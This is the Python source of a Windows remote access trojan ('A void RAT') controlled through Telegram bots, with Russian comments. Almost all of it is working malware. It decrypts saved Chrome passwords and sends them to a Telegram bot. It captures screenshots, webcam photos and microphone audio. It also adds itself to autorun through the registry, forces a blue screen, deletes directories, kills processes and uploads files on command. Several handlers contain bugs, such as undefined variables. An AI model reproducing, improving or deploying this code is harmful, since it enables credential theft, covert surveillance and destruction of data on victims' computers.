import telebot
import json
import cv2
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
from PIL import ImageGrab
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import os
import requests
import datetime
import sounddevice as sd
import wavio
import subprocess
import wmi
import ctypes
import webbrowser
import platform


bot_Token = '&&&&&&&' #Token основного бота
bot1_Token = '&&&&&&&' #Token бота которому будут приходить пароли
chat_id = '&&&&&&&&' #Chat id
bot = telebot.TeleBot(bot_Token)
bot1 = telebot.TeleBot(bot1_Token)

bot.send_message(chat_id, '🌓<b>A void RAT</b>🌗', parse_mode='HTML')
bot.send_message(chat_id, 'Напишите <b>/RAT</b> \nчто бы <b>узнать</b> команды', parse_mode='HTML')

@bot.message_handler(commands=['RAT', 'rat', 'Rat'])
def RAT(message):
    bot.send_message(chat_id, '---------⚙️Команды⚙️---------\n \n--------------------------------\n> /Passwords - Получить пароли \n> /Screen - Скриншот экрана \n> /Webcam - Фото с камеры \n> /Audio - Запись микрфона' +
                     '\n---------🔋Питание🔋---------- \n> /PowerOff - Выключить пк \n> /Reboot - Перезапустить пк' +
                     '\n--------🌓Прикольчики🌗------ \n> /BSoD - Синий экран смерти \n> /Autorun - Добавить в автозапуск \n> /Remove - Удалить RAT' +
                     '\n----------🗂Файлы🗂----------- \n> /Pwd - Показывает текущюю директорию\n> /Cd - Поменять директорию\n> /Delete - Удалить файл \n> /Download - Скачать файл' +
                     '\n--------💾программы💾-------- \n> /Tasklist - Список программ \n> /Taskkill - Закрыть программу' +
                     '\n----------🌘About🌒----------- \n> /Message - Отправить сообщение \n> /Open_url - Открыть ссылку \n> /Open - Открыть программу \n> /InfinityOpen - Открыть дохуя раз \n> /Info - Информация о ПК' +
                     '\n-------------------------------- \n \n--------------/About------------'
                     )

@bot.message_handler(commands=['Passwords', 'passwords'])
def passwords(message):
    def chrome_date_and_time(chrome_data):
        # Chrome_data format is 'year-month-date
        # hr:mins:seconds.milliseconds
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        # Local_computer_directory_path will look
        # like this below
        # C: => Users => <Your_Name> => AppData =>
        # Local => Google => Chrome => User Data =>
        # Local State
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State")

        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]

        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def main():
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]

            if user_name or decrypted_password:
                bot1.send_message(chat_id, f"Main URL: {main_url}")
                bot1.send_message(chat_id, f"Login URL: {login_page_url}")
                bot1.send_message(chat_id, f"User name: {user_name}")
                bot1.send_message(chat_id, f"Decrypted Password: {decrypted_password}")

            else:
                continue

            if date_of_creation != 86400000000 and date_of_creation:
                bot1.send_message(chat_id, f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

            if last_usuage != 86400000000 and last_usuage:
                bot1.send_message(chat_id, f"Last Used: {str(chrome_date_and_time(last_usuage))}")
            bot1.send_message(chat_id, "=" * 10)
        cursor.close()

        try:

            # trying to remove the copied db file as
            # well from local computer
            os.remove(filename)
        except:
            pass
    if __name__ == "__main__":
        main()
@bot.message_handler(commands=['screen', 'Screen']) # Ждём команды
def send_screen(command) :
    bot.send_message(chat_id, "Подождите...") # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab() # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') # Обновляем переменную
    files = {'photo': screen} # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_Token + "/sendPhoto?chat_id=" + chat_id , files=files) # Делаем запрос
@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
    try:
        bot.send_message(chat_id, "Подключаемся к первой камере...")  # Отправляем сообщение "Wait..."
        # Включаем первую камеру
        cap = cv2.VideoCapture(0)
        # Делаем снимок
        for i in range(30):
            cap.read()

        ret, frame = cap.read()

        # Записываем в файл
        cv2.imwrite('cam.png', frame)

        bot.send_photo(chat_id, photo=open("cam.png", "rb"))
        # Отключаем камеру
        cap.release()
    except:
        bot.send_message(chat_id, "Подключаемся ко второй камере...")
        # Включаем первую камеру
        cap = cv2.VideoCapture(1)
        # Делаем снимок
        for i in range(30):
            cap.read()

        ret, frame = cap.read()

        # Записываем в файл
        cv2.imwrite('cam.png', frame)

        bot.send_photo(chat_id, photo=open("cam.png", "rb"))
        # Отключаем камеру
        cap.release()
@bot.message_handler(commands=['Audio', 'audio'])
def audio(command):
    from scipy.io.wavfile import write
    fs = 44100  # Частота дискретизации
    seconds = 10  # Продолжительность записи
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Дождитесь окончания записи
    wavio.write("sound.wav", myrecording, fs, sampwidth=2)
    bot.send_audio(chat_id, audio=open(r"C:/void/code/sound.wav", 'rb'))
@bot.message_handler(commands=['PowerOff', 'Poweroff', 'poweroff'])
def poweroff(command):
    subprocess.run(['shutdown', '/s', '/t', '1'])
    bot.send_message(chat_id, "Компьютер выключается...")
@bot.message_handler(commands=['Reboot', 'reboot'])
def Reboot(command):
    restart_command = "shutdown /r /t 00"
    os.system(restart_command)
@bot.message_handler(commands=['BSoD', 'bsod'])
def BSoD(command):
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        bot.send_message(id, "BSOD Successfull!")
    else:
        bot.send_message(id, "BSOD Failed...")
@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
    reestr_path = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
    SetValueEx(reestr_path, 'worm', 0, REG_SZ, path)
    CloseKey(reestr_path)
@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
    os.rmdir('C:\Void')
    bot.send_message(chat_id, 'RAT удалён')
@bot.message_handler(commands=['Cd', 'cd'])
def CD(command):
    try:
        user_msg = "{0}".format(message.text)
        path2 = user_msg.split(" ")[1]  # Переменная - папка
        os.chdir(path2)  # Меняем директорию
        bot.send_message(chat_id, "Директория изменена на " + path2)
    except:
        bot.send_message(chat_id, "Ошибка")
@bot.message_handler(commands=['pwd', 'Pwd']) # ДИРЕКТОРИЯ
def pwd(command):
    directory = os.path.abspath(os.getcwd()) # Получаем расположение
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory))) # Отправляем сообщение
@bot.message_handler(commands = ["Delete", "delete"]) # УДАЛИТЬ ПАПКУ
def delete_dir(message):
    try:
        user_msg = "{0}".format(message.text)
        path2del = user_msg.split(" ")[1]  # Переменная - имя папка
        os.removedirs(path2del)  # Удаляем папку
        bot.send_message(chat_id, "Директория " + path2del + " удалена")
    except:
        bot.send_message(chat_id, "Ошибка")
@bot.message_handler(commands=["Download", "download"])  # ЗАГРУЗКА ФАЙЛА
def download_file(message):
    try:
        user_msg = "{0}".format(message.text)
        docc = user_msg.split(" ")[1]  # Переменная, в которой содержится имя файла
        doccc = {'document': open(docc, 'rb')}  # Переменная для POST запроса

        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=doccc)  # Отправляем файл
    except:
        bot.send_message(chat_id, "Ошибка")
@bot.message_handler(commands=["Run", "run"])  # ЗАГРУЗКА ФАЙЛА
def run(message):
    try:
        bot.send_message(chat_id, "открываем...")
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        os.startfile(link1)
        bot.send_message(chat_id, "открыли!")
    except:
        bot.send_message(chat_id, "Ошибка")
@bot.message_handler(commands=["Tasklist","tasklist"])
def Tasklist(message):
    f = wmi.WMI()
    for process in f.Win32_Process():
        bot.send_message(chat_id, f"{process.ProcessId:<10} {process.Name} \n")
@bot.message_handler(commands=["Taskkill", "taskkill"]) # ПРОЦЕССЫ
def kill_process(message):
    try:
        user_msg = "{0}".format(message.text)  # Переменная в которой содержится сообщение
        subprocess.call("taskkill /IM " + user_msg.split(" ")[1])  # Убиваем процесс по имени
        bot.send_message(chat_id, "Готово!")
    except:
        bot.send_message(chat_id, "ошибка!")
@bot.message_handler(commands=["Message", "message"])
def Message(message):
    try:
        user_msg = "{0}".format(message.text)  # Переменная в которой содержится сообщение
        ctypes.windll.user32.MessageBoxW(0, user_msg.split(" ")[1], "ERROR", 1)
    except:
        bot.send_message(chat_id, "ошибка!")
@bot.message_handler(commands=["open_url", "Open_url"]) # ОТКРЫТЬ ССЫЛКУ
def open_url(message):
    try:
        user_msg = "{0}".format(message.text)
        url = user_msg.split(" ")[1]  # Объявляем переменную, в которой содержится url
        webbrowser.open_new_tab(url)  # Открываем ссылку
        bot.send_message(chat_id, "Готово!")
    except:
        bot.send_message(chat_id, "ошибка!")
@bot.message_handler(commands=['open', 'Open'])
def open(message):
    try:
        bot.send_message(chat_id, "открываем...")
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        os.startfile(link1)
        bot.send_message(chat_id, "открыли!")
    except:
        bot.send_message(chat_id, "ошибка!")
@bot.message_handler(commands=["InfinityOpen", 'Infinityopen', 'infinityopen'])
def InfinityOpen(message):
    link = "{0}".format(message.text)
    link1 = link.split(" ")[1]
    open = os.startfile(link1)
    bot.send_message(chat_id, "открыли!")
    for open in range(999):
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        open = os.startfile(link1)
@bot.message_handler(commands=["Info", 'info'])
def Info(message):
    import uuid
    r = requests.get('http://ip.42.pl/raw')
    ip = r.text
    windows = platform.platform()  # Получаем версию Windows
    processor = platform.processor()  # Получаем характеристики процессора
    UserName = os.getlogin()
    bot.send_message(chat_id, "<b>Имя ПК:</b> " + UserName + "\n<b>Виндовс:</b> " + windows + "\n<b>Процессор:</b> " + processor + "\n<b>Ip:</b> " + ip + "\n<b>MAC:</b> " + ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
for ele in range(0,8*6,8)][::-1]) , parse_mode='HTML')
@bot.message_handler(commands=["About", 'about'])
def About(message):
    bot.send_message(chat_id, "Привет мой Друг, ты сейчас пользуешься моей RAT программой :) <b>\nName RAT: A void \nCoder: Ryodan \nRelease: 05.03.2023 \nLast update: 05.03.2023 \nVersion python: 3.11 \n14 y.o.</b>", parse_mode='HTML')
bot.polling()